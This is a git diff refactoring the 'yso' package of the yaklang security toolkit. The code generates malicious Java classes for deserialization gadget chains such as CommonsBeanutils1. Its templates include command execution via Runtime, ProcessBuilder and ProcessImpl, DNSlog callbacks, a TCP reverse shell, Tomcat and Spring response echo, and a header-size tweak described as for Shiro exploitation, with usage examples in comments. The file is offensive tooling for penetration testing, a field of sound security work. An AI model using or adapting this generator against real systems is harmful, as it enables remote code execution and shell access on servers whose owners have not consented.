@@ -1,37 +1,43 @@
 package yso
 
 import (
+	"fmt"
 	"github.com/yaklang/yaklang/common/javaclassparser"
 	"github.com/yaklang/yaklang/common/log"
 	"github.com/yaklang/yaklang/common/utils"
 	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
+	"github.com/yaklang/yaklang/common/yso/resources"
+	"path"
 	"strconv"
 )
 
-//type string string
-
 const (
-	RuntimeExecClass               = "RuntimeExecClass"
-	ProcessBuilderExecClass        = "ProcessBuilderExecClass"
-	ProcessImplExecClass           = "ProcessImplExecClass"
-	DNSlogClass                    = "DNSlogClass"
-	SpringEchoClass                = "SpringEchoClass"
-	ModifyTomcatMaxHeaderSizeClass = "ModifyTomcatMaxHeaderSizeClass"
+	RuntimeExecClass               = "RuntimeExec"
+	ProcessBuilderExecClass        = "ProcessBuilderExec"
+	ProcessImplExecClass           = "ProcessImplExec"
+	DNSlogClass                    = "DNSlog"
+	SpringEchoClass                = "SpringEcho"
+	AutoEchoClass                  = "SpringEcho"
+	ModifyTomcatMaxHeaderSizeClass = "ModifyTomcatMaxHeaderSize"
 	EmptyClassInTemplate           = "EmptyClassInTemplate"
-	TcpReverseClass                = "TcpReverseClass"
-	TcpReverseShellClass           = "TcpReverseShellClass"
-	TomcatEchoClass                = "TomcatEchoClass"
-	BytesClass                     = "BytesClass"
-	MultiEchoClass                 = "MultiEchoClass"
-	HeaderEchoClass                = "HeaderEchoClass"
-	SleepClass                     = "SleepClass"
+	TcpReverseClass                = "TcpReverse"
+	TcpReverseShellClass           = "TcpReverseShell"
+	TomcatEchoClass                = "TomcatEcho"
+	BytesClass                     = "Bytes"
+	MultiEchoClass                 = "MultiEcho"
+	HeaderEchoClass                = "HeaderEcho"
+	SleepClass                     = "Sleep"
 	//NoneClass                                = "NoneClass"
 )
 
 type ClassPayload struct {
 	ClassName string
 	Help      string
-	Generator func(*ClassConfig) (*javaclassparser.ClassObject, error)
+	Generator func(*ClassGenConfig) (*javaclassparser.ClassObject, error)
+}
+
+func init() {
+
 }
 
 var AllClasses = map[string]*ClassPayload{}
@@ -39,11 +45,25 @@ var AllClasses = map[string]*ClassPayload{}
 func GetAllClassGenerator() map[string]*ClassPayload {
 	return AllClasses
 }
-func setClass(t string, help string, f func(*ClassConfig) (*javaclassparser.ClassObject, error)) {
-	AllClasses[t] = &ClassPayload{
-		ClassName: string(t),
+
+// setClass only used in init() !!! DO NOT USE IT IN OTHER PLACE !!!
+func setClass(name string, help string, f func(config *ClassGenConfig) (*javaclassparser.ClassObject, error)) {
+	var templateBytes []byte
+	var err error
+	if name != BytesClass { // preload template, assert template name is valid
+		templateBytes, err = resources.YsoResourceFS.ReadFile(path.Join("classes", name+".class"))
+		if err != nil {
+			panic(fmt.Sprintf("read template class %s failed: %s", name, err))
+		}
+	}
+	AllClasses[name] = &ClassPayload{
+		ClassName: name,
 		Help:      help,
-		Generator: func(config *ClassConfig) (*javaclassparser.ClassObject, error) {
+		Generator: func(config *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+			if name != BytesClass {
+				config.ClassBytes = templateBytes
+			}
+
 			obj, err := f(config)
 			if err != nil {
 				return nil, err
@@ -56,21 +76,26 @@ func setClass(t string, help string, f func(*ClassConfig) (*javaclassparser.Clas
 	}
 }
 
-type ClassConfig struct {
-	Errors     []error
-	ClassType  string
-	ClassBytes []byte
-	//ClassTemplate *javaclassparser.ClassObject
-	//公共参数
+type ClassGenConfig struct {
+	Errors    []error
+	ClassType string
+
+	// common
 	ClassName     string
 	IsObfuscation bool
 	IsConstruct   bool
-	//exec参数
+
+	// user define class
+	ClassBytes []byte
+
+	// exec
 	Command      string
 	MajorVersion uint16
-	//dnslog参数
+
+	// for dnslog class
 	Domain string
-	//spring参数
+
+	//for web echo
 	HeaderKey    string
 	HeaderVal    string
 	HeaderKeyAu  string
@@ -78,15 +103,16 @@ type ClassConfig struct {
 	Param        string
 	IsEchoBody   bool
 	IsExecAction bool
-	//Reverse参数
+
+	// fot Reverse connect
 	Host      string
 	Port      int
 	Token     string
 	SleepTime int
 }
 
-func NewClassConfig(options ...GenClassOptionFun) *ClassConfig {
-	o := ClassConfig{
+func NewClassConfig(options ...GenClassOptionFun) *ClassGenConfig {
+	o := ClassGenConfig{
 		ClassName:     utils.RandStringBytes(8),
 		IsObfuscation: true,
 		IsConstruct:   false,
@@ -99,33 +125,89 @@ func NewClassConfig(options ...GenClassOptionFun) *ClassConfig {
 	}
 	return obj
 }
-func (cf *ClassConfig) AddError(err error) {
+func (cf *ClassGenConfig) AddError(err error) {
 	if err != nil {
 		cf.Errors = append(cf.Errors, err)
 	}
 }
-func (cf *ClassConfig) GenerateClassObject() (obj *javaclassparser.ClassObject, err error) {
-	if cf.ClassType == BytesClass {
-		obj, err = javaclassparser.Parse(cf.ClassBytes)
+
+// GetParamByName get param by name
+func (cf *ClassGenConfig) GetParamByName(name string) (string, bool) {
+	switch name {
+	case "command":
+		return cf.Command, true
+	case "domain":
+		return cf.Domain, true
+	case "headerKey":
+		return cf.HeaderKey, true
+	case "headerVal":
+		return cf.HeaderVal, true
+	case "headerKeyAu":
+		return cf.HeaderKeyAu, true
+	case "headerValAu":
+		return cf.HeaderValAu, true
+	case "param":
+		return cf.Param, true
+	case "host":
+		return cf.Host, true
+	case "port":
+		return strconv.Itoa(cf.Port), true
+	case "token":
+		return cf.Token, true
+	case "sleepTime":
+		return strconv.Itoa(cf.SleepTime), true
+	}
+	return "", false
+}
+func (cf *ClassGenConfig) GenerateClassObject() (obj *javaclassparser.ClassObject, err error) {
+	//if cf.ClassType == BytesClass {
+	//	obj, err = javaclassparser.Parse(cf.ClassBytes)
+	//	if err != nil {
+	//		return nil, err
+	//	}
+	//	return obj, nil
+	//}
+	if YsoConfigInstance != nil && YsoConfigInstance.Classes != nil {
+		classTmplCfg, ok := YsoConfigInstance.Classes[cf.ClassType]
+		if !ok {
+			return nil, utils.Errorf("not found class type: %s", cf.ClassType)
+		}
+		obj, err = javaclassparser.Parse(classTmplCfg.Template)
 		if err != nil {
-			return nil, err
+			return nil, utils.Errorf("parse class %s failed: %s", cf.ClassType, err)
+		}
+		for _, param := range classTmplCfg.Params {
+			val, ok := cf.GetParamByName(param.Name)
+			if !ok {
+				if param.DefaultValue != nil {
+					val = utils.InterfaceToString(param.DefaultValue)
+				} else {
+					return nil, utils.Errorf("required param %s for class %s", param.Name, cf.ClassType)
+				}
+			}
+			constant := obj.FindConstStringFromPool(fmt.Sprintf("{{%s}}", param.Name))
+			if constant == nil {
+				return nil, utils.Errorf("param %s not found in class %s", param.Name, cf.ClassType)
+			}
+			constant.Value = utils.InterfaceToString(val)
 		}
 		return obj, nil
-	}
-	payload, ok := AllClasses[cf.ClassType]
-	if !ok {
+	} else {
 		return nil, utils.Errorf("not found class type: %s", cf.ClassType)
 	}
-	obj, err = payload.Generator(cf)
-	if err != nil {
-		return nil, err
-	}
-	if obj.MajorVersion != 0 {
-		obj.MajorVersion = cf.MajorVersion
-	}
-	return obj, nil
+	//payload, ok := AllClasses[cf.ClassType]
+	//if !ok {
+	//	return nil, utils.Errorf("not found class type: %s", cf.ClassType)
+	//}
+	//obj, err = payload.Generator(cf)
+	//if err != nil {
+	//	return nil, err
+	//}
+	//if obj.MajorVersion != 0 {
+	//	obj.MajorVersion = cf.MajorVersion
+	//}
 }
-func (cf *ClassConfig) ConfigCommonOptions(obj *javaclassparser.ClassObject) error {
+func (cf *ClassGenConfig) ConfigCommonOptions(obj *javaclassparser.ClassObject) error {
 	obj.SetClassName(cf.ClassName)
 	if cf.IsConstruct == true {
 		constant := obj.FindConstStringFromPool("Yes")
@@ -142,12 +224,12 @@ func (cf *ClassConfig) ConfigCommonOptions(obj *javaclassparser.ClassObject) err
 	return nil
 }
 
-func init() {
+func _init() {
 	setClass(
 		RuntimeExecClass,
 		"使用RuntimeExec命令执行",
-		func(config *ClassConfig) (*javaclassparser.ClassObject, error) {
-			obj, err := javaclassparser.Parse(template_class_RuntimeExec)
+		func(config *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+			obj, err := javaclassparser.Parse(config.ClassBytes)
 			if err != nil {
 				return nil, err
 			}
@@ -167,8 +249,8 @@ func init() {
 	setClass(
 		ProcessImplExecClass,
 		"使用ProcessImpl命令执行",
-		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
-			obj, err := javaclassparser.Parse(template_class_ProcessImplExec)
+		func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+			obj, err := javaclassparser.Parse(cf.ClassBytes)
 			if err != nil {
 				return nil, err
 			}
@@ -188,8 +270,8 @@ func init() {
 	setClass(
 		ProcessBuilderExecClass,
 		"使用ProcessBuilderExecClass命令执行",
-		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
-			obj, err := javaclassparser.Parse(template_class_ProcessBuilderExec)
+		func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+			obj, err := javaclassparser.Parse(cf.ClassBytes)
 			if err != nil {
 				return nil, err
 			}
@@ -209,8 +291,8 @@ func init() {
 	setClass(
 		DNSlogClass,
 		"dnslog检测",
-		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
-			obj, err := javaclassparser.Parse(template_class_dnslog)
+		func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+			obj, err := javaclassparser.Parse(cf.ClassBytes)
 			if err != nil {
 				return nil, err
 			}
@@ -230,8 +312,8 @@ func init() {
 	setClass(
 		TcpReverseClass,
 		"tcp反连，可用于tcp出网的站点漏洞检测",
-		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
-			obj, err := javaclassparser.Parse(template_class_TcpReverse)
+		func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+			obj, err := javaclassparser.Parse(cf.ClassBytes)
 			if err != nil {
 				return nil, err
 			}
@@ -267,8 +349,8 @@ func init() {
 	setClass(
 		TcpReverseShellClass,
 		"tcp反弹shell",
-		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
-			obj, err := javaclassparser.Parse(template_class_TcpReverseShell)
+		func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+			obj, err := javaclassparser.Parse(cf.ClassBytes)
 			if err != nil {
 				return nil, err
 			}
@@ -295,8 +377,8 @@ func init() {
 	setClass(
 		ModifyTomcatMaxHeaderSizeClass,
 		"修改tomcat的MaxHeaderSize，一般用于shiro利用",
-		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
-			obj, err := javaclassparser.Parse(template_class_ModifyTomcatMaxHeaderSize)
+		func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+			obj, err := javaclassparser.Parse(cf.ClassBytes)
 			if err != nil {
 				return nil, err
 			}
@@ -306,8 +388,8 @@ func init() {
 	setClass(
 		EmptyClassInTemplate,
 		"用于Template代码执行的空类",
-		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
-			obj, err := javaclassparser.Parse(template_class_EmptyClassInTemplate)
+		func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+			obj, err := javaclassparser.Parse(cf.ClassBytes)
 			if err != nil {
 				return nil, err
 			}
@@ -318,7 +400,7 @@ func init() {
 	setClass(
 		BytesClass,
 		"自定义字节码，需要BASE64编码",
-		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
+		func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
 			obj, err := javaclassparser.Parse(cf.ClassBytes)
 			if err != nil {
 				return nil, err
@@ -329,8 +411,8 @@ func init() {
 	setClass(
 		TomcatEchoClass,
 		"适用于tomcat的回显",
-		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
-			obj, err := javaclassparser.Parse(template_class_EchoByThread)
+		func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+			obj, err := javaclassparser.Parse(cf.ClassBytes)
 			if err != nil {
 				return nil, err
 			}
@@ -359,8 +441,8 @@ func init() {
 	setClass(
 		MultiEchoClass,
 		"适用于tomcat和weblogic的回显",
-		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
-			obj, err := javaclassparser.Parse(template_class_MultiEcho)
+		func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+			obj, err := javaclassparser.Parse(cf.ClassBytes)
 			if err != nil {
 				return nil, err
 			}
@@ -389,8 +471,8 @@ func init() {
 	setClass(
 		SpringEchoClass,
 		"适用于spring站点的回显",
-		func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
-			obj, err := javaclassparser.Parse(template_class_SpringEcho)
+		func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+			obj, err := javaclassparser.Parse(cf.ClassBytes)
 			if err != nil {
 				return nil, err
 			}
@@ -441,8 +523,8 @@ func init() {
 			return obj, nil
 		},
 	)
-	setClass(SleepClass, "sleep指定时长，用于延时检测gadget", func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
-		obj, err := javaclassparser.Parse(template_class_Sleep)
+	setClass(SleepClass, "sleep指定时长，用于延时检测gadget", func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+		obj, err := javaclassparser.Parse(cf.ClassBytes)
 		if err != nil {
 			return nil, err
 		}
@@ -454,8 +536,8 @@ func init() {
 		}
 		return obj, nil
 	})
-	setClass(HeaderEchoClass, "自动查找Response对象并在header中回显指定内容", func(cf *ClassConfig) (*javaclassparser.ClassObject, error) {
-		obj, err := javaclassparser.Parse(template_class_HeaderEcho)
+	setClass(HeaderEchoClass, "自动查找Response对象并在header中回显指定内容", func(cf *ClassGenConfig) (*javaclassparser.ClassObject, error) {
+		obj, err := javaclassparser.Parse(cf.ClassBytes)
 		if err != nil {
 			return nil, err
 		}
@@ -472,7 +554,7 @@ func init() {
 	})
 }
 
-type GenClassOptionFun func(config *ClassConfig)
+type GenClassOptionFun func(config *ClassGenConfig)
 
 //var defaultOptions = []GenClassOptionFun{SetRandClassName(), SetObfuscation()}
 
@@ -491,7 +573,7 @@ type GenClassOptionFun func(config *ClassConfig)
 // yso.GetCommonsBeanutils1JavaObject(yso.evilClassName("EvilClass"))
 // ```
 func SetClassName(className string) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassName = className
 	}
 }
@@ -503,7 +585,7 @@ func SetClassName(className string) GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.useConstructorExecutor())
 // ```
 func SetConstruct() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.IsConstruct = true
 	}
 }
@@ -515,7 +597,7 @@ func SetConstruct() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.obfuscationClassConstantPool())
 // ```
 func SetObfuscation() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.IsObfuscation = true
 	}
 }
@@ -529,7 +611,7 @@ func SetObfuscation() GenClassOptionFun {
 // gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode))
 // ```
 func SetBytesEvilClass(data []byte) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = BytesClass
 		config.ClassBytes = data
 	}
@@ -560,7 +642,7 @@ func SetClassBase64Bytes(base64 string) GenClassOptionFun {
 // gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesClass(bytesCode))
 // ```
 func SetClassBytes(data []byte) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = BytesClass
 		config.ClassBytes = data
 	}
@@ -654,7 +736,7 @@ func GenerateClassObjectFromBytes(bytes []byte, options ...GenClassOptionFun) (*
 // yso.GetCommonsBeanutils1JavaObject(yso.command("whoami"),yso.useRuntimeExecTemplate())
 // ```
 func SetExecCommand(cmd string) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.Command = cmd
 	}
 }
@@ -664,7 +746,7 @@ func SetMajorVersion(v uint16) GenClassOptionFun {
 	const minMajorVersion uint16 = 45 //
 	const maxMajorVersion uint16 = 62 //
 
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		if v < minMajorVersion || v > maxMajorVersion {
 			v = 52
 		}
@@ -679,7 +761,7 @@ func SetMajorVersion(v uint16) GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecTemplate(),yso.command("whoami"))
 // ```
 func SetClassRuntimeExecTemplate() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = RuntimeExecClass
 	}
 }
@@ -692,7 +774,7 @@ func SetClassRuntimeExecTemplate() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))
 // ```
 func SetRuntimeExecEvilClass(cmd string) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = RuntimeExecClass
 		config.Command = cmd
 	}
@@ -722,7 +804,7 @@ func GenerateRuntimeExecEvilClassObject(cmd string, options ...GenClassOptionFun
 // yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecTemplate(),yso.command("whoami"))
 // ```
 func SetClassProcessBuilderExecTemplate() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = ProcessBuilderExecClass
 	}
 }
@@ -735,7 +817,7 @@ func SetClassProcessBuilderExecTemplate() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass("whoami"))
 // ```
 func SetProcessBuilderExecEvilClass(cmd string) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = ProcessBuilderExecClass
 		config.Command = cmd
 	}
@@ -765,7 +847,7 @@ func GenerateProcessBuilderExecEvilClassObject(cmd string, options ...GenClassOp
 // yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecTemplate(),yso.command("whoami"))
 // ```
 func SetClassProcessImplExecTemplate() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = ProcessImplExecClass
 	}
 }
@@ -778,7 +860,7 @@ func SetClassProcessImplExecTemplate() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass("whoami"))
 // ```
 func SetProcessImplExecEvilClass(cmd string) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = ProcessImplExecClass
 		config.Command = cmd
 	}
@@ -808,7 +890,7 @@ func GenerateProcessImplExecEvilClassObject(cmd string, options ...GenClassOptio
 // yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
 // ```
 func SetClassDnslogTemplate() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = DNSlogClass
 	}
 }
@@ -821,7 +903,7 @@ func SetClassDnslogTemplate() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
 // ```
 func SetDnslog(addr string) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.Domain = addr
 	}
 }
@@ -834,7 +916,7 @@ func SetDnslog(addr string) GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
 // ```
 func SetDnslogEvilClass(addr string) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = DNSlogClass
 		config.Domain = addr
 	}
@@ -865,7 +947,7 @@ func GenDnslogClassObject(domain string, options ...GenClassOptionFun) (*javacla
 // yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
 // ```
 func SetClassSpringEchoTemplate() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = SpringEchoClass
 	}
 }
@@ -880,7 +962,7 @@ func SetClassSpringEchoTemplate() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
 // ```
 func SetHeader(key string, val string) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.HeaderKey = key
 		config.HeaderVal = val
 		config.HeaderKeyAu = "Accept-Language"
@@ -896,7 +978,7 @@ func SetHeader(key string, val string) GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
 // ```
 func SetParam(val string) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.Param = val
 	}
 }
@@ -908,7 +990,7 @@ func SetParam(val string) GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
 // ```
 func SetExecAction() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.IsExecAction = true
 	}
 }
@@ -920,7 +1002,7 @@ func SetExecAction() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
 // ```
 func SetEchoBody() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.IsEchoBody = true
 	}
 }
@@ -946,7 +1028,7 @@ func GenerateSpringEchoEvilClassObject(options ...GenClassOptionFun) (*javaclass
 // yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useModifyTomcatMaxHeaderSizeTemplate())
 // ```
 func SetClassModifyTomcatMaxHeaderSizeTemplate() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = ModifyTomcatMaxHeaderSizeClass
 	}
 }
@@ -983,7 +1065,7 @@ func GenEmptyClassInTemplateClassObject(options ...GenClassOptionFun) (*javaclas
 // yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
 // ```
 func SetClassTcpReverseTemplate() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = TcpReverseClass
 	}
 }
@@ -999,7 +1081,7 @@ func SetClassTcpReverseTemplate() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
 // ```
 func SetTcpReverseHost(host string) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.Host = host
 	}
 }
@@ -1015,7 +1097,7 @@ func SetTcpReverseHost(host string) GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
 // ```
 func SetTcpReversePort(port int) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.Port = port
 	}
 }
@@ -1030,7 +1112,7 @@ func SetTcpReversePort(port int) GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
 // ```
 func SetTcpReverseToken(token string) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.Token = token
 	}
 }
@@ -1047,7 +1129,7 @@ func SetTcpReverseToken(token string) GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseEvilClass(host,8080),yso.tcpReverseToken(token))
 // ```
 func SetTcpReverseEvilClass(host string, port int) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = TcpReverseClass
 		config.Host = host
 		config.Port = port
@@ -1084,7 +1166,7 @@ func GenTcpReverseClassObject(host string, port int, options ...GenClassOptionFu
 // yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellTemplate(),yso.tcpReverseShellHost(host),yso.tcpReverseShellPort(8080))
 // ```
 func SetClassTcpReverseShellTemplate() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = TcpReverseShellClass
 	}
 }
@@ -1100,7 +1182,7 @@ func SetClassTcpReverseShellTemplate() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
 // ```
 func SetTcpReverseShellEvilClass(host string, port int) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = TcpReverseShellClass
 		config.Host = host
 		config.Port = port
@@ -1137,7 +1219,7 @@ func GenTcpReverseShellClassObject(host string, port int, options ...GenClassOpt
 // headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
 // ```
 func SetClassTomcatEchoTemplate() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = TomcatEchoClass
 	}
 }
@@ -1153,7 +1235,7 @@ func SetClassTomcatEchoTemplate() GenClassOptionFun {
 // headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
 // ```
 func SetTomcatEchoEvilClass() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = TomcatEchoClass
 	}
 }
@@ -1185,7 +1267,7 @@ func GenTomcatEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.Cl
 // headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
 // ```
 func SetClassMultiEchoTemplate() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = MultiEchoClass
 	}
 }
@@ -1201,7 +1283,7 @@ func SetClassMultiEchoTemplate() GenClassOptionFun {
 // headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
 // ```
 func SetMultiEchoEvilClass() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = MultiEchoClass
 	}
 }
@@ -1231,7 +1313,7 @@ func GenMultiEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.Cla
 // yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
 // ```
 func SetClassHeaderEchoTemplate() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = HeaderEchoClass
 	}
 }
@@ -1244,7 +1326,7 @@ func SetClassHeaderEchoTemplate() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
 // ```
 func SetHeaderEchoEvilClass() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = HeaderEchoClass
 	}
 }
@@ -1270,7 +1352,7 @@ func GenHeaderEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.Cl
 // yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
 // ```
 func SetClassSleepTemplate() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = SleepClass
 	}
 }
@@ -1283,7 +1365,7 @@ func SetClassSleepTemplate() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useSleepEvilClass(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
 // ```
 func SetSleepEvilClass() GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.ClassType = SleepClass
 	}
 }
@@ -1309,7 +1391,7 @@ func GenSleepClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassOb
 // yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
 // ```
 func SetSleepTime(time int) GenClassOptionFun {
-	return func(config *ClassConfig) {
+	return func(config *ClassGenConfig) {
 		config.SleepTime = time
 	}
 }
